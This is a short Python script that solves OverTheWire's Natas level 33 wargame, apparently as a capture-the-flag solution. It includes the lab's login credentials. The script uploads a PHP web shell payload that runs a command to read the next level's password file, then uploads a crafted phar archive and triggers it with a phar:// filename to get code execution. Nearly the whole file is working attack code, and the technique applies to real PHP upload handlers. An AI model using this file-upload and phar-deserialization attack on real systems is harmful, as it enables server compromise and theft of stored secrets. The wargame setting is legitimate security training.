#!/usr/bin/python

import requests, urllib, hashlib

url = "http://natas33.natas.labs.overthewire.org/index.php"

auth = ("natas33", "shoogeiGa2yee3de6Aex8uaXeech5eey")

# TMP: /var/lib/php5/uploadtmp/php******
# UPLOADS: /natas33/uploads/
# WWW: /var/www/natas/natas33/index.php

exploit = '<?php echo exec("cat /etc/natas_webpass/natas34") ?>'

filename = 'asdf.php'
files = {
    'filename': (None, filename),
    'uploadedfile': ('asdf.php', exploit, 'text/plain')
}

r = requests.post(url, auth=auth, files=files)

if 'uploaded' in r.text and 'Warning' not in r.text:
	print("asdf.php uploaded")

exploit = open('test.phar', 'rb')
files['filename'] = (None, 'test.phar')
files['uploadedfile'] = ('test.phar', exploit, 'text/plain')

r = requests.post(url, auth=auth, files=files)
if 'uploaded' in r.text and 'Warning' not in r.text:
	print("test.phar uploaded")


files['filename'] = (None, 'phar://test.phar')
files['uploadedfile'] = ('test.phar', 'asdf', 'text/plain')

print('Executing test.phar')
r = requests.post(url, auth=auth, files=files)
print(r.text)